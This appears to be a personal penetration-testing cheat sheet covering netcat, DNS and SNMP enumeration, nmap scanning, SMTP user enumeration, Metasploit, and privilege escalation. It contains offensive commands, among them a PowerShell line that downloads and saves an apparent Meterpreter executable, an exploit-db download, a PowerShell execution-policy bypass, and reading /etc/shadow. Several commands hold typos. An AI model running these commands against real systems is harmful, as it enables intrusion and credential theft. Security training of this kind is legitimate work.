#----- Bash -----#

## For loop
for ip in $(cat file.txt); do echo $ip; done

## Create directory structure for each IP in file.txt
for ip in $(cat file.txt); do mkdir -p "$ip"/{penetration,notes,pillage,remote-enum,root-in-10-steps-or-less}; done

## Parse file data
cut -d'.' -f1 filename.txt |sort -u



# Wordlist locations
/usr/share 


#----- Linux Commands -----#
### Process Running
netstat -antp | grep sshd

### Start HTTP Service (/var/www)
service apache2 start

### Service Persistence on reboot 
update-rc.d ssh enable
update-rc.d apache2 enable


#----- NetCat -----#
### Connect using netcat
nc -nv IPaddress port

### Netcat listner
nv -nlvp 4444

## Netcat transfer

### Receiver
nc -nlvp 4444 > incoming.txt

### Sender
nc -nv IPaddress port </path/of/file.txt

### SIMPLE TCP & UDP PORT SCAN
nc -nvv -w 1 -z IPADDRESS START_PORT-END_PORT
nc -unvv -w 1 -z IPADDRESS START_PORT-END_PORT


#----- NCat (Supports encrypted tunnel) -----#
### Listener
ncat -nlvp IPAddress 4444

### Connect
ncat -v IPAddress 4444 --ssl

#----- Google Hacking CMD -----#
### Search specific site
Site:"microsoft.com"

### Exclude results from www.microsoft.com
Site:"microsoft.com" -site:"www.microsoft.com

### Search specific file type
site:"microsoft.com: filetype:ppt

intitle:"VNC viewer for java"

inurl:"/specific/url/"

# ----- DNS ENUMBERATION ----- #
### name server
host -t ns domain.com

### mail server
host -t mx domain.com

### Forward lookup (domain to IP)
for subdomain in $(list.txt);do nslookup $subdomain.DOMAIN.com|grep "Address: " | cut -d " " -f1,4;done

### Reverse DNS lookup (IP range to doamin)
for ip in (seq 1 255); do host 10.10.10.$ip |grep "DOMAIN" |cut -d" " -f1,5; done

### ZONE TRANSFERS (Get all domains in DNS)
host -l ns DOMAIN.COM

## BUILT TOOLS
DNSRECON, DNSENUM


# ----- PORT SCANNING ----- #
SYN SCANNING (half scan) 

### NMAP SCRIPTS
/usr/share/nmap/scripts

### PING SWEEP
nmap -sn 192.168.1.1/24

### NMAP GOOD ARGUMENTS
-oG = Grepable output

--reason: Display the reason a port is in a particular state

--top--ports (nmap -sT --top-ports 20 IPAddress -oG filename.txt)

-sV = Banner grabbing

-O = OS fingerprinting

-A: Enable OS detection, version detection, script scanning, and traceroute

--open = only display results of open ports

# ----- SMB (PORT 139, 445) ----- #
### Identify smb or netbios services
nbtscan 192.168.1.0/24

# ----- SMTP (PORT 25) ----- #
nc -nv IP ADDRESS 25
VRFY USERID

## Bash to connect to smb from userlist
for user in $(cat users.txt); do echo VRFY $user | nc -nv IPADDRESS 25 2>/dev/null | grep ^"250"; done

# ----- SNMP (PORT 161)----- #
nmap -sU --open -p 161 IPADDRESS

### Brute force community string
onesixtyone -c community -i ips

### Once community string is discovered, data can be reterived by SNMPWALK
### List of running programs
snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.25.4.2.1.2

### List of open tcp ports
snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.6.13.1.3

### List of installed software 
snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.25.6.3.1.2

## Other Tools
SNMPENUM
SNMPCHECK

# ----- VULN SCANNING ----- #
nmap -p 80 --script all IPADDRESS

## Other Tools
openvas-setup



# ----- Transferring Files from Linux to  ----- #
### Python Webserver 
python -m SimpleHTTPServer

### Transfer to Windows with no broswer
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"


# ----- Metasploit ----- #
jobs
sessions -i 1

cme smb -U USERID -p PASSWORD --local-auth IPADDRESS

# ----- Windows CMD To RUN ----- #
whoami
net user
cmd /c
reg
msbuild
wscript

### Check if user is in local admins group
net localgroup administrators

# ----- RDP from LINXU to Win ----- #
rdesktop -u USERID -p PASSWORD IPADDRESS -f

# ----- TRICKS AND TIPS ----- #
### Command output on screen and on file
ls -l 2>&1 | tee file.txt

### Convert python exploit to Windows Exe
pywin

# ----- PRIVELEDGE ESCALATION ----- # 

### DownLoad exploit with wget
wget -O exploitName.c https://www.exploit-db.com/download/12932

### FIND MISSING PATCHES
c:\> wmic qfe get Caption,Description,HotFixID,InstalledOn

Speachsploit MS16 windows local

### OTHER TOOLS
### Source: https://wiki.securityweekly.com/TS_Episode02

### PowerUp by harmj0y: https://github.com/PowerShellMafia/PowerSploit
powershell -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

Potato by foxglovesec: https://github.com/foxglovesec/Potato
Tater (PowerShell Implementation of Hot Potato exploit): https://github.com/Kevin-Robertson/Tater
SessionGopher: https://github.com/fireeye/SessionGopher


### LINUX
id
cat /etc/shadow
egrep -ir 'searchterm'
